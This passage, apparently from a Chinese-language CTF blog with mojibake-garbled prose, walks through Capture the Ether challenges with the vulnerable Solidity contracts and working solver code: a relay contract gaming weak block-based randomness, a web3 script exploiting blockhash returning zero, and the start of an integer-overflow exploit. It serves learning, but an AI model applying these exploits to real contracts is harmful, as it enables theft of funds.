FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a><br><a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-ii-478365775a34">Letâ€™s Play â€” Capture the Ether : Lotteries (Part II) </a></p><h3 id="5-Predict-the-future"><a href="#5-Predict-the-future" class="headerlink" title="5.  Predict the future"></a>5.  Predict the future</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.</p><p>Note that it is indeed possible to solve this challenge without losing any ether.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser &#x3D;&#x3D; 0);</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; msg.sender;</span><br><span class="line">        guess &#x3D; n;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; 0;</span><br><span class="line">        if (guess &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è§£é¢˜ï¼š</strong></p><p>ï¼Œ é¢˜ç›®è¦æ±‚å…ˆé€šè¿‡ <code>lockInGuess</code> ä¸‹æ³¨ï¼Œ ç„¶åè°ƒç”¨ <code>settle</code> å¼€å¥–ã€‚ ç”±äº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†ä»£ç çš„å­˜åœ¨ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥é€šè¿‡é¢„æµ‹æ¥è§£å†³è¿™ä¸ªé¢˜ç›®ã€‚ ä½†æ˜¯ç”±äº <code>answer</code> èŒƒå›´ä¸º 0 - 9ï¼Œ æˆ‘ä»¬å¯ä»¥å…ˆ lock ä¸€ä¸ªå€¼ï¼Œ ç„¶åå½“è§‰å¾—æ—¶æœºåˆé€‚çš„ï¼Œå³ <code>answer == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</code>  çš„æ—¶å€™ï¼Œæˆ‘ä»¬å†è°ƒç”¨ <code>settle</code> ã€‚</p><ol><li>é¦–å…ˆç¼–å†™ä¸€ä¸ªä¸­ç»§åˆçº¦ï¼Œ åˆçº¦å†…å®¹è¦èƒ½è°ƒç”¨ challenge çš„ lock ä»¥åŠ<code>settle</code>ï¼Œ åœ¨åˆçº¦ä¸­è°ƒç”¨ settle å‰è¦åˆ¤æ–­ä¸‹æ˜¯å¦æ—¶æœºç¬¦åˆ</li><li>ç¼–å†™ä¸€ä¸ª web3 è„šæœ¬ï¼Œ æ¥è°ƒç”¨ä¸­ç»§åˆçº¦çš„åˆ¤æ–­å‡½æ•°ï¼Œ å½“ challenge çš„ <code>isComplete</code> å·²ç»è¢«è°ƒç”¨åï¼Œ å°±é€€å‡ºè„šæœ¬</li></ol><p>PS: ç¼–å†™ web3 python3 è„šæœ¬æ‰€éœ€è¦çš„ API JSON å¯åœ¨ Remix ä¸­å¯¼å‡ºã€‚</p><p><strong>codeï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IGuessTheNewNumberChallenge &#123;</span><br><span class="line">    function isComplete() external view returns (bool);</span><br><span class="line">    function lockInGuess(uint8 n) external payable;</span><br><span class="line">    function settle() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberSolver &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberSolver() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(address _addr, uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        IGuessTheNewNumberChallenge challenge &#x3D; IGuessTheNewNumberChallenge(_addr);</span><br><span class="line">        </span><br><span class="line">        challenge.lockInGuess.value(msg.value)(n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle(address _addr, uint8 n ) public payable &#123;</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">        if (answer &#x3D;&#x3D; n )&#123;</span><br><span class="line">            IGuessTheNewNumberChallenge challenge &#x3D; IGuessTheNewNumberChallenge(_addr);</span><br><span class="line">            challenge.settle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner) ;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-Predict-the-block-hash"><a href="#6-Predict-the-block-hash" class="headerlink" title="6.   Predict the block hash"></a>6.   Predict the block hash</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser &#x3D;&#x3D; 0);</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; msg.sender;</span><br><span class="line">        guess &#x3D; hash;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer &#x3D; block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; 0;</span><br><span class="line">        if (guess &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=VbTrdj7vPGU">Get Lucky</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>æ ¹æ®é»„çš®ä¹¦å¯¹ <code>BLOCKHASH </code> çš„å®šä¹‰ï¼šåªèƒ½è·å–æœ€è¿‘ 256 ä¸ªåŒºå—çš„å“ˆå¸Œï¼Œè¶…å‡ºæ—¶è¿”å› 0</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆçŒœ 0 çš„ hashï¼Œ ç„¶åç­‰ä»–è¶…è¿‡ 256 ä¸ªåŒºå—ï¼Œå†æ¥å¼€å¥–ã€‚ å¯ä»¥ç”¨ python3 web3ç›´æ¥å®ç°åˆ©ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;&quot;</span></span><br><span class="line">wallet_addr = <span class="string">&quot;&quot;</span></span><br><span class="line">wallet_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;settle&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;hash&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bytes32&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;lockInGuess&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[key]&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line">acct = w3.eth.account.from_key(wallet_private_key) </span><br><span class="line"></span><br><span class="line">my_guess_hash = <span class="string">&quot;0000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line"></span><br><span class="line">print(w3.eth.getTransactionCount(acct.address))</span><br><span class="line"></span><br><span class="line">print(contract.all_functions())</span><br><span class="line"></span><br><span class="line">tx = contract.functions.lockInGuess(my_guess_hash).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="string">&quot;value&quot;</span>:  Web3.toWei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">            <span class="string">&quot;gas&quot;</span>: <span class="number">3000000</span>,</span><br><span class="line">            <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gasPrice,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">            <span class="string">&quot;chainId&quot;</span>: <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">signed = acct.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line"></span><br><span class="line">print(w3.eth.wait_for_transaction_receipt(tx_id, timeout=  <span class="number">300</span> ))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="1-Token-sale"><a href="#1-Token-sale" class="headerlink" title="1. Token sale"></a>1. Token sale</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.</p><p>The contract starts off with a balance of 1 ether. See if you can take some of that away.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN &#x3D; 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] +&#x3D; numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -&#x3D; numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=tgIqecROs5M"><del>Sale</del>Â Sail</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p><code>buy</code> å‡½æ•°ä¸­çš„ä¹˜æ³•å­˜åœ¨æº¢å‡ºï¼Œ å› æ­¤æˆ‘ä»¬å¯ä»¥ä½ä¹°é«˜å– ã€‚ æ­¤å¤„çš„msg.valueæ˜¯ä»¥etherä¸ºå•ä½ï¼Œå› ä¸ºä¸€ä¸ªPRICE_PRE_TOKENå°±æ˜¯1 etherï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æ˜ç™½åœ¨ä»¥å¤ªåŠé‡Œæœ€å°çš„å•ä½æ˜¯weiï¼Œæ‰€ä»¥æ­¤å¤„çš„1 etheräº‹å®ä¸Šä¹Ÿå°±æ˜¯10^18 weiï¼Œå³å…¶å€¼çš„å¤§å°ä¸º10^18 weiï¼Œè¿™æ ·å°±æ»¡è¶³æˆ‘ä»¬æº¢å‡ºçš„æ¡ä»¶äº†ï¼Œå› ä¸ºä»¥å¤ªåŠå¤„ç†æ•°æ®æ˜¯ä»¥256ä½ä¸ºå•ä½ï¼Œæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªè¾ƒå¤§çš„numTokensï¼Œä¹˜æ³•è¿ç®—æº¢å‡ºåæ‰€éœ€çš„mag.valueå°±éå¸¸å°äº†ï¼Œ ç›´æ¥åˆ©ç”¨ Python è„šæœ¬è§£å†³è¿™ä¸ªé¢˜ç›®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> timeout</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;0x0e27e17Ab06db38134825299a2bA0A3749Ea810c&quot;</span></span><br><span class="line">wallet_addr = <span class="string">&quot;0x5b667caAC1E53411D9b87Fc39eEe2F881FDDF589&quot;</span></span><br><span class="line">wallet_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;balanceOf&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;numTokens&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;buy&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;numTokens&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;sell&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span 